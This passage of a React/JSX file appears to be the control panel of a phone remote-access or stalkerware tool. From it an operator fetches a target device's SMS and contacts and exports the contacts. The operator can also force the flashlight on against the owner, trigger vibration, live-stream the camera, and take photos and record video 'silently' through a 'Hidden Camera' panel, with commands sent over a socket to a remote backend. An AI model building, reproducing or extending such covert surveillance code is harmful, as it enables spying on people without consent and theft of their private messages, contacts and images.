                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all cursor-pointer"
                                        >
                                            <div className="flex justify-between items-start mb-2">
                                                <span className="font-medium text-sm">{sms.address}</span>
                                                <span className="text-xs text-white/40">
                                                    {new Date(sms.date).toLocaleDateString()} {new Date(sms.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                                </span>
                                            </div>
                                            <p className="text-sm text-white/70 line-clamp-2">{sms.body}</p>
                                            <div className="flex gap-2 mt-2">
                                                <span className={`text-xs px-2 py-0.5 rounded ${sms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
                                                    {sms.type === 1 ? 'Received' : 'Sent'}
                                                </span>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                    {!selectedDeviceId
                                        ? "Select a device to view SMS"
                                        : isFetchingSms
                                            ? "Fetching SMS..."
                                            : "Click \"Fetch All SMS\" to load messages"}
                                </div>
                            )}
                        </div>
                    )}

                    {/* Contacts Tool */}
                    {selectedTool === 'contacts' && (
                        <div className="space-y-4">
                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
                                <div className="flex gap-2">
                                    <button
                                        onClick={fetchContacts}
                                        disabled={!selectedDeviceId || isFetchingContacts}
                                        className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                    >
                                        {isFetchingContacts ? (
                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                        )}
                                        Fetch Contacts
                                    </button>
                                    {contactsList.length > 0 && (
                                        <button
                                            onClick={downloadContactsAsVcf}
                                            className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
                                        >
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                            vCard
                                        </button>
                                    )}
                                </div>
                                <div className="relative w-full sm:w-64">
                                    <input
                                        type="text"
                                        placeholder="Search contacts..."
                                        value={contactsSearchQuery}
                                        onChange={(e) => setContactsSearchQuery(e.target.value)}
                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
                                    />
                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                                </div>
                            </div>

                            {contactsList.length > 0 ? (
                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto">
                                    <p className="text-xs text-white/40 col-span-full">{filteredContacts.length} contacts</p>
                                    {filteredContacts.map((contact: any) => (
                                        <div
                                            key={contact.id}
                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all"
                                        >
                                            <div className="flex items-center gap-3 mb-2">
                                                <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-sm">
                                                    {contact.name?.charAt(0)?.toUpperCase() || '?'}
                                                </div>
                                                <div className="flex-1 min-w-0">
                                                    <p className="font-medium text-sm truncate">{contact.name}</p>
                                                </div>
                                            </div>
                                            {contact.phones?.length > 0 && (
                                                <div className="space-y-1">
                                                    {contact.phones.slice(0, 2).map((phone: any, idx: number) => (
                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1">
                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                                                            {typeof phone === 'string' ? phone : phone?.number || 'Unknown'}
                                                        </p>
                                                    ))}
                                                </div>
                                            )}
                                            {contact.emails?.length > 0 && (
                                                <div className="mt-1">
                                                    {contact.emails.slice(0, 1).map((email: any, idx: number) => (
                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1 truncate">
                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                                                            {typeof email === 'string' ? email : email?.address || 'Unknown'}
                                                        </p>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                    {!selectedDeviceId
                                        ? "Select a device to view contacts"
                                        : isFetchingContacts
                                            ? "Fetching contacts..."
                                            : "Click \"Fetch Contacts\" to load contacts"}
                                </div>
                            )}
                        </div>
                    )}

                    {/* Torch Tool */}
                    {selectedTool === 'torch' && (
                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
                            <div className="flex items-center justify-between mb-8">
                                <div>
                                    <h3 className="text-xl font-bold mb-1">Flashlight Control</h3>
                                    <p className="text-white/40 text-sm">Control device flashlight remotely</p>
                                </div>
                                <button
                                    onClick={toggleTorch}
                                    disabled={!selectedDeviceId}
                                    className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
                                </button>
                            </div>

                            <div className="space-y-4 pt-4 border-t border-white/10">
                                <div className="flex items-center justify-between p-4 rounded-xl bg-black/20">
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-red-500/20 text-red-400">
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                                        </div>
                                        <div>
                                            <p className="font-medium text-sm">Aggressive Mode</p>
                                            <p className="text-xs text-white/40">Forces flashlight ON if turned off by user</p>
                                        </div>
                                    </div>
                                    <button
                                        onClick={() => setTorchAggressive(!torchAggressive)}
                                        className={`w-12 h-6 rounded-full transition-colors relative ${torchAggressive ? 'bg-red-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${torchAggressive ? 'left-7' : 'left-1'}`} />
                                    </button>
                                </div>

                                {torchAggressive && (
                                    <div className="p-4 rounded-xl bg-black/20 animate-fadeIn">
                                        <label className="block text-xs font-medium text-white/60 mb-2">Duration (minutes)</label>
                                        <div className="flex items-center gap-4">
                                            <input
                                                type="range"
                                                min="1"
                                                max="5"
                                                step="1"
                                                value={torchDuration / 60000}
                                                onChange={(e) => setTorchDuration(parseInt(e.target.value) * 60000)}
                                                className="flex-1 accent-yellow-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
                                            />
                                            <span className="text-sm font-bold w-12 text-right">{torchDuration / 60000}m</span>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* Vibration Tool */}
                    {selectedTool === 'vibration' && (
                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
                            <div className="flex items-center justify-between mb-8">
                                <div>
                                    <h3 className="text-xl font-bold mb-1">Vibration Control</h3>
                                    <p className="text-white/40 text-sm">Vibrate device remotely</p>
                                </div>
                            </div>

                            <div className="space-y-6">
                                <div>
                                    <label className="block text-xs font-medium text-white/60 mb-2">Duration (seconds)</label>
                                    <div className="flex items-center gap-4">
                                        <input
                                            type="range"
                                            min="0.5"
                                            max="10"
                                            step="0.5"
                                            value={vibrationDuration / 1000}
                                            onChange={(e) => setVibrationDuration(parseFloat(e.target.value) * 1000)}
                                            className="flex-1 accent-orange-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
                                        />
                                        <span className="text-sm font-bold w-12 text-right">{vibrationDuration / 1000}s</span>
                                    </div>
                                </div>

                                <button
                                    onClick={triggerVibration}
                                    disabled={!selectedDeviceId}
                                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId ? 'bg-gradient-to-r from-orange-500 to-red-500 hover:scale-[1.02] shadow-lg shadow-orange-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
                                >
                                    <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                    Vibrate Now
                                </button>
                            </div>
                        </div>
                    )}

                    {/* Advanced Camera Tool - Surveillance Hub */}
                    {selectedTool === 'camera' && (
                        <div className="space-y-6">
                            {/* Live Feed & Controls */}
                            <div className="bg-black/40 border border-white/10 rounded-2xl overflow-hidden backdrop-blur-md">
                                {/* Header */}
                                <div className="p-4 border-b border-white/10 flex items-center justify-between bg-black/20">
                                    <div className="flex items-center gap-3">
                                        <div className={`w-3 h-3 rounded-full ${isLiveStreaming ? 'bg-red-500 animate-pulse shadow-[0_0_10px_red]' : 'bg-green-500/50'}`} />
                                        <div>
                                            <h3 className="font-bold text-white tracking-wide">SURVEILLANCE HUB</h3>
                                            <p className="text-xs text-white/40 font-mono">{selectedDeviceId ? `CONNECTED: ${selectedDeviceId.substring(0, 8)}...` : 'DISCONNECTED'}</p>
                                        </div>
                                    </div>
                                    <div className="text-right">
                                        <div className="text-xs font-mono text-cyan-400">CAM: {cameraMode.toUpperCase()}</div>
                                        {isRecording && <div className="text-xs font-mono text-red-400">REC: {recordingProgress.current}s</div>}
                                    </div>
                                </div>

                                {/* Main Viewport */}
                                <div className="relative aspect-video bg-black/80 flex items-center justify-center overflow-hidden">
                                    {isLiveStreaming && liveFrame ? (
                                        <img
                                            src={`data:image/jpeg;base64,${liveFrame}`}
                                            className="w-full h-full object-contain"
                                            alt="Live Feed"
                                        />
                                    ) : (
                                        <div className="text-center p-10">
                                            <div className="w-20 h-20 mx-auto border-2 border-white/10 rounded-full flex items-center justify-center mb-4">
                                                <svg className="w-10 h-10 text-white/20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                            </div>
                                            <p className="text-white/30 font-mono text-sm">FEED OFFLINE</p>
                                        </div>
                                    )}

                                    {/* Overlays */}
                                    <div className="absolute top-4 right-4 flex gap-2">
                                        <button
                                            onClick={() => setCameraMode(prev => prev === 'back' ? 'front' : 'back')}
                                            className="p-2 rounded-lg bg-black/50 text-white/70 hover:text-white hover:bg-black/70 border border-white/10 transition-all"
                                            title="Switch Camera"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                        </button>
                                    </div>
                                </div>

                                {/* Control Panel */}
                                <div className="p-4 grid grid-cols-3 gap-4 bg-white/5">
                                    {/* Live Stream Button */}
                                    <button
                                        onClick={() => {
                                            if (!selectedDeviceId) return;
                                            if (isLiveStreaming) {
                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                setIsLiveStreaming(false);
                                                setLiveFrame(null);
                                            } else {
                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
                                                setIsLiveStreaming(true);
                                            }
                                        }}
                                        className={`py-3 rounded-xl font-bold flex flex-col items-center gap-1 transition-all ${isLiveStreaming ? 'bg-red-500 text-white shadow-lg shadow-red-500/20' : 'bg-white/10 text-white hover:bg-white/20'}`}
                                        disabled={!selectedDeviceId || isRecording}
                                    >
                                        <span className="text-xs uppercase tracking-wider">{isLiveStreaming ? 'Stop Live' : 'Go Live'}</span>
                                    </button>

                                    {/* Capture Photo */}
                                    <button
                                        onClick={() => {
                                            if (!selectedDeviceId) return;
                                            setIsCapturingPhoto(true);
                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
                                        }}
                                        className="py-3 rounded-xl bg-white/10 text-white hover:bg-white/20 font-bold flex flex-col items-center gap-1 transition-all active:scale-95"
                                        disabled={!selectedDeviceId || isCapturingPhoto}
                                    >
                                        {isCapturingPhoto ? <span className="w-4 h-4 border-2 border-white/50 border-t-white rounded-full animate-spin" /> : <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>}
                                        <span className="text-xs uppercase tracking-wider">Snap</span>
                                    </button>

                                    {/* Record Video */}
                                    <button
                                        onClick={() => {
                                            if (!selectedDeviceId) return;
                                            if (isRecording) {
                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                setIsRecording(false);
                                            } else {
                                                socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: 60 });
                                                setIsRecording(true);
                                            }
                                        }}
                                        className={`py-3 rounded-xl font-bold flex flex-col items-center gap-1 transition-all ${isRecording ? 'bg-red-500 text-white' : 'bg-white/10 text-white hover:bg-white/20'}`}
                                        disabled={!selectedDeviceId || isLiveStreaming}
                                    >
                                        <span className="text-xs uppercase tracking-wider">{isRecording ? 'Stop Rec' : 'Record'}</span>
                                    </button>
                                </div>
                            </div>

                            {/* Captured Media Gallery */}
                            {capturedMedia.length > 0 && (
                                <div className="bg-white/5 border border-white/10 p-4 rounded-2xl">
                                    <div className="flex justify-between items-center mb-4">
                                        <h4 className="font-bold text-white/80 flex items-center gap-2">
                                            <span className="text-xl">📂</span> CAPTURES
                                        </h4>
                                        <button onClick={() => setCapturedMedia([])} className="text-xs text-white/40 hover:text-white">Clear</button>
                                    </div>
                                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
                                        {capturedMedia.map((media, i) => {
                                            const isUrl = media.data.startsWith('/') || media.data.startsWith('http');
                                            const src = isUrl
                                                ? (media.data.startsWith('http') ? media.data : `https://backend-api-gallery.onrender.com${media.data}`)
                                                : `data:image/jpeg;base64,${media.data}`;

                                            return (
                                                <div key={i} className="group relative aspect-square bg-black rounded-lg overflow-hidden border border-white/10 cursor-pointer transition-all hover:scale-[1.02]">
                                                    {media.type === 'photo' ? (
                                                        <img src={src} className="w-full h-full object-cover opacity-80 group-hover:opacity-100" />
                                                    ) : (
                                                        <video src={media.type === 'video' && !isUrl ? `data:video/mp4;base64,${media.data}` : src} className="w-full h-full object-cover" />
                                                    )}
                                                    <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity p-2 flex flex-col justify-end">
                                                        <a href={src} target="_blank" download={`capture_${i}`} className="text-xs text-white font-bold bg-white/20 p-1.5 rounded text-center backdrop-blur-sm hover:bg-white/40">
                                                            DOWNLOAD
                                                        </a>
                                                    </div>
                                                    <div className="absolute top-1 right-1 px-1.5 py-0.5 rounded bg-black/60 text-[10px] text-white/70 font-mono">
                                                        {new Date(media.timestamp).toLocaleTimeString()}
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                </div>
                            )}
                        </div>
                    )}
                    <div className="space-y-6">
                        {/* Camera Controls Card */}
                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
                            <div className="flex items-center justify-between mb-6">
                                <div>
                                    <h3 className="text-xl font-bold mb-1">Hidden Camera</h3>
                                    <p className="text-white/40 text-sm">Capture photos & videos silently</p>
                                </div>
                                <div className="p-3 rounded-xl bg-pink-500/20">
                                    <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                </div>
                            </div>

                            {/* Error Message */}
                            {cameraError && (
                                <div className="mb-4 p-3 rounded-lg bg-red-500/20 border border-red-500/30 text-red-400 text-sm">
                                    ⚠️ {cameraError}
                                </div>
                            )}

                            {/* Camera Selection */}
                            <div className="mb-6">
                                <label className="block text-xs font-medium text-white/60 mb-3">Camera</label>
                                <div className="flex gap-2">
                                    <button
                                        onClick={() => setCameraMode('back')}
                                        className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'back' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
                                    >
                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>
                                        Back Camera
                                    </button>
                                    <button
                                        onClick={() => setCameraMode('front')}
                                        className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'front' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
                                    >
                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                                        Front Camera
                                    </button>
                                </div>
                            </div>

                            {/* Capture Photo */}
                            <div className="mb-6">
                                <button
                                    onClick={() => {
                                        if (!selectedDeviceId || isCapturingPhoto || isRecording) return;
                                        setIsCapturingPhoto(true);
                                        setCameraError(null);
                                        socket?.emit('capture_photo', {
                                            uuid: session?.user?.uuid,
                                            targetDeviceId: selectedDeviceId,
                                            camera: cameraMode
                                        });
                                    }}
                                    disabled={!selectedDeviceId || isCapturingPhoto || isRecording}
                                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto && !isRecording ? 'bg-gradient-to-r from-pink-500 to-purple-500 hover:scale-[1.02] shadow-lg shadow-pink-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
                                >
                                    {isCapturingPhoto ? (
                                        <>
                                            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                                            Capturing...
                                        </>
                                    ) : (
                                        <>
                                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                            📸 Capture Photo
                                        </>
                                    )}
                                </button>
                            </div>

                            {/* Video Recording */}
                            <div className="space-y-4">
                                <label className="block text-xs font-medium text-white/60">Video Recording</label>

                                {/* Duration Selection */}
                                <div className="grid grid-cols-4 gap-2">
                                    {[
                                        { label: '1 min', value: 60 },
                                        { label: '2 min', value: 120 },
                                        { label: '5 min', value: 300 },
                                        { label: 'Live', value: -1 }
                                    ].map((option) => (
                                        <button
                                            key={option.value}
                                            onClick={() => setRecordingDuration(option.value)}
                                            className={`py-2 rounded-lg text-sm font-medium transition-all ${recordingDuration === option.value ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
                                        >
                                            {option.label}
                                        </button>
                                    ))}
                                </div>

                                {/* Recording Progress */}
                                {isRecording && (
                                    <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/30">
                                        <div className="flex items-center justify-between mb-2">
                                            <span className="text-red-400 font-medium flex items-center gap-2">
                                                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                                Recording...
                                            </span>
                                            <span className="text-white/60 text-sm">
                                                {recordingProgress.current}s / {recordingProgress.total === -1 ? '∞' : `${recordingProgress.total}s`}
                                            </span>
                                        </div>
                                        {recordingProgress.total > 0 && (
                                            <div className="h-2 rounded-full bg-white/10 overflow-hidden">
                                                <div
                                                    className="h-full bg-red-500 transition-all duration-1000"
                                                    style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}
                                                />
                                            </div>
                                        )}
                                    </div>
                                )}

                                {/* Record/Stop Buttons */}
                                {!isRecording ? (
                                    <button
                                        onClick={() => {
                                            if (!selectedDeviceId || isCapturingPhoto) return;
                                            setIsRecording(true);
                                            setCameraError(null);
                                            setRecordingProgress({ current: 0, total: recordingDuration });
                                            socket?.emit('start_recording', {
                                                uuid: session?.user?.uuid,
                                                targetDeviceId: selectedDeviceId,
                                                camera: cameraMode,
                                                duration: recordingDuration
                                            });
                                        }}
                                        disabled={!selectedDeviceId || isCapturingPhoto}
                                        className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto ? 'bg-gradient-to-r from-red-500 to-pink-500 hover:scale-[1.02] shadow-lg shadow-red-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
                                    >
                                        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" /></svg>
                                        🎥 Start Recording ({recordingDuration === -1 ? 'Live' : `${recordingDuration / 60}min`})
                                    </button>
                                ) : (
                                    <button
                                        onClick={() => {
                                            socket?.emit('stop_recording', {
                                                uuid: session?.user?.uuid,
                                                targetDeviceId: selectedDeviceId
                                            });
                                        }}
                                        className="w-full py-4 rounded-xl font-bold text-lg bg-white text-black hover:bg-gray-200 transition-all flex items-center justify-center gap-2"
                                    >
                                        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
                                        ⏹️ Stop Recording
                                    </button>
                                )}
                            </div>

                            {/* No Device Warning */}
                            {!selectedDeviceId && (
                                <div className="mt-4 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-sm text-center">
                                    Select a device from the top menu to use the camera
                                </div>
                            )}
                        </div>

                        {/* Captured Media Gallery */}
                        {capturedMedia.length > 0 && (
                            <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
                                <div className="flex items-center justify-between mb-4">
                                    <h3 className="text-lg font-bold">Captured Media</h3>
                                    <button
                                        onClick={() => setCapturedMedia([])}
                                        className="text-xs text-white/40 hover:text-red-400 transition-colors"
                                    >
                                        Clear All
                                    </button>
                                </div>
                                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
                                    {capturedMedia.map((media, idx) => (
                                        <div key={idx} className="relative group aspect-square rounded-xl overflow-hidden bg-black/50 border border-white/10">
                                            {media.type === 'photo' ? (
                                                <img
                                                    src={`data:image/jpeg;base64,${media.data}`}
                                                    alt={`Captured ${idx}`}
                                                    className="w-full h-full object-cover"
                                                />
                                            ) : (
                                                <video
                                                    src={`data:video/mp4;base64,${media.data}`}
                                                    className="w-full h-full object-cover"
                                                    controls
                                                />
                                            )}
                                            <div className="absolute top-2 left-2 px-2 py-1 rounded-md bg-black/70 text-xs">
                                                {media.type === 'photo' ? '📷' : '🎥'} {media.camera}
                                            </div>
                                            <div className="absolute bottom-0 left-0 right-0 p-2 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                                                <div className="text-xs text-white/60">
                                                    {new Date(media.timestamp).toLocaleString()}
                                                </div>
                                                <a
                                                    href={`data:${media.type === 'photo' ? 'image/jpeg' : 'video/mp4'};base64,${media.data}`}
                                                    download={`capture_${media.timestamp}.${media.type === 'photo' ? 'jpg' : 'mp4'}`}
                                                    className="text-xs text-purple-400 hover:text-purple-300"
                                                >
                                                    Download
                                                </a>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>
                )}
                    <div className="hidden"></div> {/* Buffer line */}
                </div>

                {/* Gallery Section - Only show when Gallery tool is selected */}
                {selectedTool === 'gallery' && (
                    <>
                        <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
                            <h2 className="text-2xl font-bold">Your Gallery</h2>

                            {/* Tabs */}
                            <div className="flex p-1 bg-white/5 rounded-xl border border-white/10 self-start">
                                <button
                                    onClick={() => setActiveTab('all')}
                                    className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'all' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                                >
                                    All
                                </button>
                                <button
                                    onClick={() => setActiveTab('image')}
                                    className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'image' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                                >
                                    Images
                                </button>
                                <button
                                    onClick={() => setActiveTab('video')}
                                    className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'video' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                                >
                                    Videos
                                </button>
                                <button
                                    onClick={() => setActiveTab('zip')}
                                    className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all flex items-center gap-1 ${activeTab === 'zip' ? 'bg-purple-500/20 text-purple-400 shadow-sm' : 'text-white/40 hover:text-white/70'}`}
                                >
                                    📦 ZIP
                                </button>
                            </div>
                        </div>

                        {/* Selection Toolbar */}
                        {isSelectionMode && (
                            <div className="fixed bottom-4 left-4 right-4 md:bottom-8 md:left-1/2 md:right-auto md:-translate-x-1/2 z-40 flex flex-col md:flex-row items-stretch md:items-center gap-2 md:gap-4 p-3 md:p-4 rounded-2xl bg-[#1a1a1a] border border-white/20 shadow-2xl animate-slideUp max-w-full md:max-w-max">
                                <div className="flex items-center justify-between md:justify-start gap-2 md:gap-4">
                                    <span className="text-sm font-medium px-2 whitespace-nowrap">{selectedItems.size} Selected</span>
                                    <div className="h-6 w-px bg-white/10 hidden md:block" />
